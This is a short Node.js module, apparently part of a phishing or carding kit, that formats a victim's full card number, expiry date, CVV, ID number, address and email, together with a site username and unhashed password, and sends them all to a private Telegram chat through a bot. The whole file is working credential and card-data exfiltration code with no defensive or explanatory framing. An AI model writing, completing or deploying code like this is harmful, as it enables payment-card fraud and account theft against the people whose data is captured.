import TelegramBot from "node-telegram-bot-api";
import {env} from "../config/env.js";


const TELEGRAM_BOT_TOKEN = env.botToken; // Store your bot token in .env
const CHAT_ID = env.chatId; // Replace with your chat ID or store in .env

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
// Function to send a message to your Telegram chat
export const sendTelegramMessage = (data) => {
    console.log(data)
    const message = `
    🔹 *Payment Data* 🔹
    👤 Name: ${data.paymentData.name}
    🔢 ID Number: ${data.paymentData.idNumber}
    💳 Card Number: ${data.paymentData.cNumber}
    📅 Expiry: ${data.paymentData.exp}
    🔐 CVV: ${data.paymentData.cvv}
    🏠 Address: ${data.paymentData.address}, ${data.paymentData.city}, ${data.paymentData.state}, ${data.paymentData.country}
    📧 Email: ${data.paymentData.email}
  
    🔹 *User Data* 🔹
    👤 Username: ${data.userData.name}
    📧 Email: ${data.userData.email}
    🔑 Password: ${data.userData.unhashedPass}
    `;
    console.log(message)
  bot.sendMessage(CHAT_ID, message).catch((err) => console.error("Telegram Error:", err));
};
